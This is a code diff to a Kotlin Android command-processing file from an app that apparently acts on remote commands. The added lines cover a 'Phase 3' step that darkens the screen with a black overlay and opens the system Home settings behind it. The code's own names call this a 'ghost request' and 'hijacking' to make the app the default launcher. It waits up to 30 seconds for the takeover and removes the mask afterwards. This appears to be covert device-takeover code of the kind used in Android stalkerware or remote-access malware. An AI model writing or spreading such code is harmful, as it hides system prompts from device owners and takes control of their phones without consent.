@@ -2074,24 +2074,42 @@ object CommandProcessor {
                         if (currentHome == ctx.packageName) {
                             DebugLogger.log("RBT_LIFECYCLE", "Phase 3 SKIPPED: Already the Default Launcher.")
                         } else {
-                            DebugLogger.log("RBT_LIFECYCLE", "Not default Launcher (Current: $currentHome). Initiating ghost request.")
+                            DebugLogger.log("RBT_LIFECYCLE", "Not default Launcher (Current: $currentHome). Initiating EXACT standalone ghost request.")
                             LauncherManager.isHijacking = true
                             LauncherManager.pendingCmdId = id
+                            
                             android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                // Apply the black mask specifically for Phase 3, just like the standalone command
+                                DimmerManager.applyDim(ctx, 0, "AUTO")
                                 try {
                                     val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                         addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                     }
                                     ctx.startActivity(intent)
+                                    DebugLogger.log("RBT_LIFECYCLE", "Fired Intent for ACTION_HOME_SETTINGS.")
                                 } catch (e: Exception) { 
                                     DebugLogger.log("RBT_LIFECYCLE", "Failed to open Home Settings: ${e.message}")
                                     LauncherManager.isHijacking = false 
+                                    DimmerManager.removeOverlay(ctx)
                                 }
                             }
+                            
                             var timeout = 0
-                            while(LauncherManager.isHijacking && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
-                            if (timeout >= 30) DebugLogger.log("RBT_LIFECYCLE", "Phase 3 TIMEOUT after 30s.")
-                            else DebugLogger.log("RBT_LIFECYCLE", "Phase 3 COMPLETED in ${timeout}s.")
+                            while(LauncherManager.isHijacking && timeout < 30) { 
+                                kotlinx.coroutines.delay(1000) 
+                                timeout++ 
+                                if (timeout % 5 == 0) DebugLogger.log("RBT_LIFECYCLE", "Phase 3 Waiting... (${timeout}s)")
+                            }
+                            
+                            if (timeout >= 30) {
+                                DebugLogger.log("RBT_LIFECYCLE", "Phase 3 TIMEOUT after 30s. Forcing abort.")
+                                LauncherManager.isHijacking = false
+                                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                    DimmerManager.removeOverlay(ctx)
+                                }
+                            } else {
+                                DebugLogger.log("RBT_LIFECYCLE", "Phase 3 COMPLETED in ${timeout}s.")
+                            }
                         }
 
                         prefs.edit().putBoolean("hijacks_completed", true).apply()
